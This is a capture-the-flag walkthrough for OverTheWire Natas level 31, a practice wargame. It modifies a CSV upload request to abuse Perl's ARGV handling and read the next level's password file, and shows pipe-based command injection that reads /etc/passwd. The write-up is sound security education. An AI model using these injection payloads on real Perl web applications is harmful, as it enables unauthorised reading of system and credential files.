# 🕸️Natas Level 31 → Level 32

```
http://natas31.natas.labs.overthewire.org
```
Username: natas31  
Password: (natas31_password)

![n31s1](n31s1.png)

check sourcecode

![n31s2](n31s2.png)

We’re testing by uploading a simple CSV file.

![n31s3](n31s3.png)

It shows a clean table of contents from the file we uploaded.

![n31s4](n31s4.png)

Next, we upload the file again to grab the request and send it to Replay.

![n31s5](n31s5.png)

Here’s the original POST request.

![n31s6](n31s6.png)

We make some changes to the request
```
### Line 1
POST /index.pl?/etc/natas_webpass/natas32 HTTP/1.1

### Line 15-19
------WebKitFormBoundaryK1DFqIQBcpL3sdfI
Content-Disposition: form-data; name="file"
Content-Type: text/csv

ARGV
```
![n31s7](n31s7.png)

When the request is sent, the flag appears.

![n31s8](n31s8.png)

Commands can also be run by using ``|`` at the end
```
?cat+/etc/passwd+|
or
?cat%20/etc/passwd%20|
```
![n31s9](n31s9.png)

Here’s an example of that

![n31s10](n31s10.png)

---

### 💡 Useful Resource For Clearer Understanding
Netanel Rubin: The Perl Jam 2 on Blackhat Asia 2016
```
### Netanel Rubin: The Perl Jam 2 (youtube video)
https://youtu.be/RPvORV2Amic
### Presentation Slide on Blackhat (pdf file)
https://blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf
```

Excellent! Use this flag to proceed to the next round.











